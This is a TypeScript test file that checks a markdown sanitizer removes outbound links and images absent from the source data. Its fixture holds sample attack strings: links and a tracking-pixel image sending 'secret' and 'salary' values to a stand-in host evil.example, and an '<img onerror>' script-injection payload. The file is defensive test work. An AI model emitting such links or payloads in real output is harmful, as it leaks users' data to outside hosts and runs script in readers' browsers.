import { describe, expect, test } from "bun:test";

import { sanitizeMarkdown, urlsIn } from "#delivery/sanitize";

describe("outbound sanitizing", () => {
  test("drops images and links that weren't in the source data", () => {
    const md = [
      "See [the PR](https://github.com/acme/api/pull/7) and [this](https://evil.example/?q=secret)",
      "![](https://evil.example/pixel?d=salary) <https://evil.example/a> raw https://evil.example/b",
      "<img src=x onerror=alert(1)>",
    ].join("\n");
    const out = sanitizeMarkdown(
      md,
      urlsIn({ url: "https://github.com/acme/api/pull/7" })
    );
    expect(out).toContain("[the PR](https://github.com/acme/api/pull/7)");
    expect(out).not.toContain("evil.example");
    expect(out).toContain("this");
  });
});
